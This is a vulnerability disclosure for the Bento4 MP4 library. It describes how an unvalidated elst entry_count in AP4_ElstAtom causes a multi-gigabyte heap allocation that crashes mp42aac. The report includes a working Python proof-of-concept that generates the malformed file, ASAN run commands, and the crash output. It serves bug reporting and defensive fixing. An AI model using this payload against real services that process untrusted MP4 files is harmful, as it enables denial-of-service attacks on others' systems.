## Bug0: Unbounded elst entry_count Causes Massive Heap Allocation and DoS in AP4_ElstAtom Constructor

In `AP4_ElstAtom::AP4_ElstAtom()` (Ap4ElstAtom.cpp:72-73), the `entry_count` field is read directly from the stream with no upper-bound validation and passed to `m_Entries.EnsureCapacity(entry_count)` whose return value is ignored, causing `AP4_Array::EnsureCapacity` to request an allocation of `entry_count * 24` bytes that exhausts process memory and crashes the process.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTFILE = "poc_input.mp4"

def make_box(type_str, payload=b""):
    size = 8 + len(payload)
    return struct.pack(">I", size) + type_str.encode("ascii") + payload

def make_fullbox(type_str, version, flags, payload=b""):
    flags_bytes = struct.pack(">I", flags & 0xFFFFFF)[1:]
    fb_payload = struct.pack(">B", version) + flags_bytes + payload
    return make_box(type_str, fb_payload)

# ftyp box: 16 bytes
ftyp_payload = b"isom" + struct.pack(">I", 0)
ftyp = make_box("ftyp", ftyp_payload)

# elst box: version=0, flags=0, entry_count=0x20000000, no actual entry data
TRIGGER_ENTRY_COUNT = 0x20000000
elst_payload = struct.pack(">I", TRIGGER_ENTRY_COUNT)
elst = make_fullbox("elst", 0, 0, elst_payload)

# Nest: edts -> trak -> moov
edts = make_box("edts", elst)
trak = make_box("trak", edts)
moov = make_box("moov", trak)

mp4_data = ftyp + moov

with open(OUTFILE, "wb") as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to {OUTFILE}")
print(f"elst entry_count = 0x{TRIGGER_ENTRY_COUNT:08X} ({TRIGGER_ENTRY_COUNT})")
print(f"EnsureCapacity will call ::operator new({TRIGGER_ENTRY_COUNT} * 24) = ~{TRIGGER_ENTRY_COUNT * 24 / (1024**3):.1f} GB")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (1024Mb vs 1202Mb)

### Impact

An attacker who supplies a crafted MP4 file with an oversized `elst` box `entry_count` can cause mp42aac to request approximately 12 GB of heap memory during parsing, exhausting available memory and crashing the process. This constitutes a reliable denial-of-service condition triggered by any invocation of mp42aac on an untrusted MP4 file. On systems without memory overcommit, the uncaught `std::bad_alloc` exception propagates without any error handling and terminates the process immediately.
